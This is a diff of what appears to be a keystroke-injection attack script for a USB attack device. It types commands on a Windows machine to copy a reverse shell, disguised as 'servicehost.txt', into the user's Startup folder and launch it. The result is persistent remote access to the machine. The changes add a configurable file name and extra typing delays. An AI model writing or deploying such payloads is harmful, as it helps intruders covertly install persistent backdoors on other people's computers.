@@ -20,6 +20,9 @@ LD="1500"
 #Edit the line below to copy a reverse shell and execute it or not ("#" = Not copy/execute "" = do copy and execute)
 RS="#"
 
+#Reverse shell name CONFIGURATION
+name=servicehost.txt
+
 #Target ip CONFIGURATION
 #Edit the line below if you want to get the targets IP ("#" = Do not save target ip "" = save target ip)
 TP="#"
@@ -124,12 +127,16 @@ Q ENTER
 Q DELAY $FD
 $RS Q STRING copy
 $RS Q SPACE
+$RS Q DELAY $ND
 $RS Q CONTROL v
+$RS Q DELAY $FD
 $RS Q BACKSPACE
-$RS Q STRING 'payloads\servicehost.txt' "'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+$RS Q DELAY $FD
+$RS Q STRING "payloads\\"$name" 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 $RS Q ENTER
 $RS Q DELAY $FD
-$RS Q STRING start "'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\servicehost.txt'"
+$RS Q STRING "start 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\"$name"\'"
+$RS Q DELAY $SFD
 $RS Q ENTER
 $RS Q DELAY $LD
 $RS Q DELAY $LD
